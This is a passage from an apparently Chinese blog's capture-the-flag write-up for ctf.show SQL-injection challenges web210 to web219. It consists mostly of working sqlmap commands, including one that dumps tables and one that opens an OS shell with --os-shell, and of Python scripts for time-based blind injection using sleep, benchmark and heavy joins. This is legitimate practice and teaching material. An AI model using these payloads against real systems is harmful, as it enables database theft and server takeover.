class="number">0x0a</span>) + <span class="string">&#x27;like&#x27;</span> + <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span><span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            retVal += payload[i]</span><br><span class="line">        <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --dbs</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --tables -D  ctfshow_web</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavi --columns </span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavi -C ctfshow_flagxx --dump </span><br></pre></td></tr></table></figure>

<h1 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h1><h2 id="base64解密翻转字符过滤空格"><a href="#base64解密翻转字符过滤空格" class="headerlink" title="base64解密翻转字符过滤空格"></a>base64解密翻转字符过滤空格</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407221144978.png" alt="image-20220407221144978"></p>
<p>210脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --dbs</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --tables -D  ctfshow_web</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavia --columns </span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavia -C ctfshow_flagxxa --dump </span><br></pre></td></tr></table></figure>

<h1 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h1><h2 id="base64解密翻转字符过滤空格-1"><a href="#base64解密翻转字符过滤空格-1" class="headerlink" title="base64解密翻转字符过滤空格 *"></a>base64解密翻转字符过滤空格 *</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407221504134.png" alt="image-20220407221504134"></p>
<p><a target="_blank" rel="noopener" href="http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/">http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --dbs</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --tables -D  ctfshow_web</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavis --columns </span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavis -C ctfshow_flagxsa --dump </span><br></pre></td></tr></table></figure>

<h1 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h1><h2 id="使用–os-shell-一键getshell"><a href="#使用–os-shell-一键getshell" class="headerlink" title="使用–os-shell 一键getshell"></a>使用–os-shell 一键getshell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://45646f72-e298-4956-87c9-62cea287a473.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://45646f72-e298-4956-87c9-62cea287a473.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web210 --dump  --os-shell --batch</span><br></pre></td></tr></table></figure>

<p>这里还没写完,但是已经写的差不多了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407222705713.png" alt="image-20220407222705713"></p>
<p>发现是一个上传文件页面</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407222740808.png" alt="image-20220407222740808"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407223832502.png" alt="image-20220407223832502"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407223908157.png" alt="image-20220407223908157"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407223941771.png" alt="image-20220407223941771"></p>
<h1 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h1><p>没找到参数在哪,翻翻源码看看</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408110118163.png" alt="image-20220408110118163"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408110151699.png" alt="image-20220408110151699"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408110311009.png" alt="image-20220408110311009"></p>
<p>我们看看这个select.js的写法,发现向api&#x2F;post了ip和debug两个参数</p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>判断</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://74b615cd-aac0-4c4a-889f-84aa544d2a96.challenge.ctf.show/api/&quot;</span></span><br><span class="line">payload = <span class="string">&quot;length(database())=0&quot;</span> <span class="comment">#没延迟</span></span><br><span class="line"><span class="comment">#payload = &quot;length(database())&gt;0&quot; #延迟</span></span><br><span class="line">date = &#123;</span><br><span class="line">    <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;if((<span class="subst">&#123;payload&#125;</span>),sleep(2),1)&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;debug&#x27;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.post(url, data=date, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;没延迟&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;延迟&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查列名字-id.flag</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flaga from ctfshow_flagx&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1)&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h1><h2 id="过滤单引号时间盲注"><a href="#过滤单引号时间盲注" class="headerlink" title="过滤单引号时间盲注"></a>过滤单引号时间盲注</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4ba8a766-0fda-4c66-bdbc-0e3f0a9d57dc.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查列名字-id.flag</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaa from ctfshow_flagxc&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1&#x27; or if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1) and &#x27;1&#x27;=&#x27;1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h1><h2 id="base64解码id"><a href="#base64解码id" class="headerlink" title="base64解码id"></a>base64解码id</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408124221533.png" alt="image-20220408124221533"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0f3060ee-be00-4090-a8e7-fc0944779c24.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查列名字-id.flag</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxcc&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaac from ctfshow_flagxcc&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;&#x27;MQ==&#x27;) or if (ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h1><h2 id="benchmark-时间盲注"><a href="#benchmark-时间盲注" class="headerlink" title="benchmark()时间盲注"></a>benchmark()时间盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408132254910.png" alt="image-20220408132254910"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">benchmark(t,exp)</span><br><span class="line">    select benchmark(count,expr),是重复执行count次expr表达式，使得处理时间很长，来产生延迟，</span><br><span class="line">    比如select benchmark(1000000,encode(&quot;hello&quot;,&quot;good&quot;));</span><br><span class="line">    select benchmark( 5000000, md5( &#x27;test&#x27; ));</span><br></pre></td></tr></table></figure>

<p>判断</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://9b2612c9-bd0f-4733-9729-1efec72f21f9.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;length(database())=0&quot; #没延迟</span></span><br><span class="line">payload = <span class="string">&quot;length(database())&gt;0&quot;</span> <span class="comment">#延迟</span></span><br><span class="line">date = &#123;</span><br><span class="line">    <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) or if((<span class="subst">&#123;payload&#125;</span>),benchmark(3480500,sha(1)),1)#&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;debug&#x27;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.post(url, data=date, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;没延迟&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;延迟&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bc98f2a3-911d-4606-9d0e-e277bf086bdf.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> j / <span class="number">2</span> == <span class="number">1</span>: <span class="comment">#算两个让数据库歇一会,不然数据库还没算完,就算下一个会有误差</span></span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#表名 ctfshow_flagxccb</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment">#字段名 flagaabc</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 数据 防止查错咱们多等会呗,可用改改benchmark的循环次数,我改到7400000</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaabc from ctfshow_flagxccb&quot;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> :<span class="string">f&quot;1) or if((ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)))&gt;<span class="subst">&#123;mid&#125;</span>,benchmark(3480500,sha(1)),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url , data= data ,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#time.sleep(0.3)</span></span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid +<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        ans += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/forforever/p/13019703.html">MySQL时间盲注五种延时方法</a></p>
<h1 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h1><h2 id="多表联合查询时间盲注"><a href="#多表联合查询时间盲注" class="headerlink" title="多表联合查询时间盲注"></a>多表联合查询时间盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408142736722.png" alt="image-20220408142736722"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8121f42d-c9da-4307-94b0-c7345a92f907.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="comment">#算两个让数据库歇一会,不然数据库还没算完,就算下一个会有误差</span></span><br><span class="line">        time.sleep(<span class="number">6</span>)</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#表名 ctfshow_flagxc</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment">#字段名 flagaabc</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 数据 防止查错咱们多等会呗 我直接就查一个</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaac from ctfshow_flagxc&quot;</span></span><br><span class="line">        <span class="comment">#ctfshow&#123;2d33427a-d593-4d42-85a2-a459a676b1b0&#125;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> :<span class="string">f&quot;1) or if((ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)))&gt;<span class="subst">&#123;mid&#125;</span>,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url , data= data ,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#time.sleep(0.3)</span></span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid +<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        ans += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>

<h1 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220408172145807.png" alt="image-20220408172145807"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://51762119-b7e0-4b2a-a392-0f5fded552ac.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="comment">#算两个让数据库歇一会,不然数据库还没算完,就算下一个会有误差</span></span><br><span class="line"></span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#表名 ctfshow_flagxca</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment">#字段名 flagaabc</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxca&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 数据 防止查错咱们多等会呗 我直接就查一个</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaabc from ctfshow_flagxca&quot;</span></span><br><span class="line">        <span 